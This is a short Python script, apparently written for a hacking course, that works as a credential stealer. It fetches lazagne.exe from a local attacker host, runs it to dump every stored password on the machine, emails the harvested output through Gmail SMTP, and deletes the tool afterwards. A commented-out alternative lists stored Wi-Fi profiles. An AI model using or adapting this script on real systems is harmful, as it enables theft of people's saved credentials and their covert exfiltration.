#!/usr/bin/env python3

import os, re, requests, smtplib, subprocess
#import requests - enable http requests module through python
#os - library for cross-platform os command calls; otherwise you'd have to use
#subprocess.call and the specific platform commmand

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1] #split with / as delim -1 for last element in list
    #print(file_name)
    #print(get_response) #returns response object
    #print(get_response.content) #show content of response object
    with open(file_name, "wb") as out_file: #wb - open file for writing as binary
        out_file.write(get_response.content)
        
def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    #(from_addr, to_addr, message)
    server.quit()
    
download("http://10.0.2.13/hackfiles/lazagne.exe")
#download("http://rarlab.com/rar/wrar571.exe")
#download("http://vulnweb.com/acunetix-logo.png")

email = input("Enter email address to send to: ")
password = input("Enter email password: ")

#command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
command = "lazagne.exe all"
result = subprocess.check_output(command, shell=True)
send_email(email, password, result)
os.remove("lazagne.exe") #delete executed file once it finishes
